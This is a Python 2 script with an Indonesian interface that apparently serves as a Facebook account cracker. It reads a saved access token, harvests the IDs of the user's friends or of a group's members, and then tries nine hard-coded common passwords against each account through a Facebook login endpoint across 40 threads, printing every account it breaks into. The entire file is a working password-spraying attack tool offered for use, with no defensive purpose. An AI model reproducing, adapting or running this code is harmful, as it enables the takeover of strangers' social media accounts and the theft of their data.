import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, marshal
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

    from requests.exceptions import ConnectionError
    from mechanize import Browser
    reload(sys)
    sys.setdefaultencoding('utf8')
    br = mechanize.Browser()
    br.set_handle_robots(False)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

    def keluar():
        print '\x1b[91m[\x1b[0m#\x1b[91m] \x1b[0mSAMPAI JUMPA CUK'
        sys.exit()


    logo = '\x1b[93m ______             _                 _   \n|  ____|           | |               | |  \n| |__ __ _  ___ ___| |__   ___   ___ | |_ \n|  __/ _` |/ __/ _ \\ `_ \\ / _ \\ / _ \\| __|\n| | | (_| | (_|  __/ |_) | (_) | (_) | |_ \n|_|  \\__,_|\\___\\___|_.__/ \\___/ \\___/ \\__|'
    back = 0
    threads = []
    berhasil = []
    cekpoint = []
    gagal = []
    id = []
    try:
        toket = open('cookie/login.txt', 'r').read()
    except IOError:
        print '\x1b[0m[\x1b[91m!\x1b[0m] Akses Token Tidak Ada'
        os.system('rm -rf cookie/login.txt')

os.system('clear')
print logo
print '\x1b[0m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
print '\x1b[91m[\x1b[0m1\x1b[91m] \x1b[0mCRACK DARI PERTEMANAN V2'
print '\x1b[91m[\x1b[0m2\x1b[91m] \x1b[0mCRACK DARI MEMBER GRUP V2'
print '\x1b[91m[\x1b[0m0\x1b[91m] \x1b[0mKEMBALI'
lol = raw_input('Masukan Nomer: ')
if lol == '':
    print '\x1b[0m[\x1b[91m!\x1b[0m] Tidak Boleh Kosong'
    ajg()
elif lol == '1' or lol == '01':
    os.system('clear')
    print logo
    print '\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    print '\x1b[0m[\x1b[92m*\x1b[0m] Sedang Mengumpulkan Id Teman'
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    z = json.loads(r.text)
    for s in z['data']:
        id.append(s['id'])

elif lol == '2' or lol == '02':
    os.system('clear')
    print logo
    print '\x1b[0m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    idg = raw_input('\x1b[0m[\x1b[92m?\x1b[0m] Masukan ID Grup: ')
    try:
        r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
        asw = json.loads(r.text)
        print '\x1b[0m[\x1b[92m*\x1b[0m] Nama grup : \x1b[93m' + asw['name']
    except KeyError:
        print '\x1b[0m[\x1b[91m!\x1b[0m] Grup tidak ditemukan'
        sys.exit()

    re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
    s = json.loads(re.text)
    for i in s['data']:
        id.append(i['id'])

elif lol == '0' or lol == '00':
    keluar()
else:
    print '\x1b[0m[\x1b[91m!\x1b[0m] Nomer ' + lol + ' Tidak Ada Bambank'
print '\x1b[0m[\x1b[92m#\x1b[0m] ID Yang Di Temukan : ' + str(len(id))
print '\x1b[0m[\x1b[92m*\x1b[0m] Cracking Password Di Mulai...'
print '\x1b[0m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'

def main(arg):
    user = arg
    try:
        a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
        b = json.loads(a.text)
        mmk1 = 'maungbandung'
        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + mmk1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
        q = json.load(data)
        if 'access_token' in q:
            print '\x1b[0m[\x1b[92mDAPET\x1b[0m] - ' + user + ' - ' + mmk1
        else:
            mmk2 = 'realmadrid'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + mmk2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[0m[\x1b[92mDAPET\x1b[0m] - ' + user + ' - ' + mmk2
            else:
                mmk3 = 'indonesia1945'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + mmk3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[0m[\x1b[92mDAPET\x1b[0m] - ' + user + ' - ' + mmk3
                else:
                    lahir = 'persib1933'
                    mmk4 = lahir.replace('/', '')
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + mmk4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[0m[\x1b[92mDAPET\x1b[0m] - ' + user + ' - ' + mmk4
                    else:
                        mmk5 = 'anjing123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + mmk5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[0m[\x1b[92mDAPET\x1b[0m] - ' + user + ' - ' + mmk5
                        else:
                            mmk6 = 'jakarta'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + mmk6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[0m[\x1b[92mDAPET\x1b[0m] - ' + user + ' - ' + mmk6
                            else:
                                mmk7 = 'persibbandung'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + mmk7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[0m[\x1b[92mDAPET\x1b[0m] - ' + user + ' - ' + mmk7
                                else:
                                    mmk8 = 'persijajakarta'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + mmk8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[0m[\x1b[92mDAPET\x1b[0m] - ' + user + ' - ' + mmk8
                                    else:
                                        mmk9 = 'viking'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + mmk9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[0m[\x1b[92mDAPET\x1b[0m] - ' + user + ' - ' + mmk9
    except:
        pass


p = ThreadPool(40)
p.map(main, id)
print '\n\x1b[92m[\x1b[0m+\x1b[92m] \x1b[0mSELESAI CUK'
keluar()
